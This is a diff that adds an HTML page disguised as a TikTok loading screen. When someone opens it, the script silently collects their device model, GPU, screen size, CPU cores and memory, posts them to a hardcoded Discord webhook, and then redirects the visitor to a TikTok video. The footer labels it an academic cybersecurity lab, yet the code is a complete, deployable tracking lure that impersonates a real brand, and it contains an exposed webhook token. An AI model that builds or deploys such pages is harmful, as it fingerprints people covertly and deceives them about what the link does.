@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #121212; 
+            margin: 0; 
+            color: #ffffff;
+            overflow: hidden;
+        }
+        .tiktok-loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        /* Animación del logo clásico de TikTok (Cian y Rojo parpadeante) */
+        .logo-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+        .dot {
+            position: absolute;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            animation: move 1.2s infinite ease-in-out;
+        }
+        .dot-1 {
+            background-color: #00f2fe;
+            mix-blend-mode: screen;
+        }
+        .dot-2 {
+            background-color: #fe2c55;
+            animation-delay: -0.6s;
+            mix-blend-mode: screen;
+        }
+        @keyframes move {
+            0%, 100% { transform: translateX(-20px) scale(1); }
+            50% { transform: translateX(20px) scale(1.1); }
+        }
+        p {
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            color: rgba(255, 255, 255, 0.75);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="tiktok-loader">
+        <div class="logo-container">
+            <div class="dot dot-1"></div>
+            <div class="dot dot-2"></div>
+        </div>
+        <p>Abriendo en TikTok...</p>
+    </div>
+
+    <script>
+        // TU URL DE DISCORD SE MANTIENE
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554562359383556197/wJs1y9CfsQFL10UI5K-Y40M2k0OOfdqtV_3mg9Iy1wWFE25RkeuI4l0edpvbNwOjLSik";
+        
+        // REEMPLAZA ESTE ENLACE POR EL VIDEO REAL DE TIKTOK QUE QUIERAS MOSTRAR
+        const VIDEO_DESTINO = "https://www.tiktok.com/@r6_xvv/video/7515913288111213842?_r=1&_t=ZS-9A8yIAJHNOW";
+
+        async function capturarDatos() {
+            let datos = {
+                modelo_hints: "No disponible (Bloqueado o no soportado)",
+                gpu: "No disponible",
+                pantalla: window.screen.width + "x" + window.screen.height,
+                nucleos_cpu: navigator.hardwareConcurrency || "Desconocido",
+                ram_aproximada: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida"
+            };
+
+            if (navigator.userAgentData) {
+                try {
+                    const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+                    if (ua.model) datos.modelo_hints = ua.model;
+                } catch (e) {}
+            }
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    datos.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+
+            const mensajeDiscord = {
+                embeds: [{
+                    title: "📱 ¡Nuevo Dispositivo Detectado (TikTok Mask)!",
+                    color: 16642133, // Color rosado de TikTok
+                    fields: [
+                        { name: "Modelo (Client Hints)", value: datos.modelo_hints, inline: true },
+                        { name: "Procesador Gráfico (GPU)", value: datos.gpu, inline: true },
+                        { name: "Resolución de Pantalla", value: datos.pantalla, inline: true },
+                        { name: "Núcleos CPU", value: String(datos.nucleos_cpu), inline: true },
+                        { name: "Memoria RAM", value: datos.ram_aproximada, inline: true }
+                    ],
+                    footer: { text: "Laboratorio Académico de Ciberseguridad" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(mensajeDiscord)
+                });
+            } catch (error) {}
+
+            // Redirección forzada tras 400 milisegundos
+            setTimeout(() => {
+                window.location.href = VIDEO_DESTINO;
+            }, 400);
+        }
+
+        window.onload = capturarDatos;
+    </script>
+</body>
+</html>
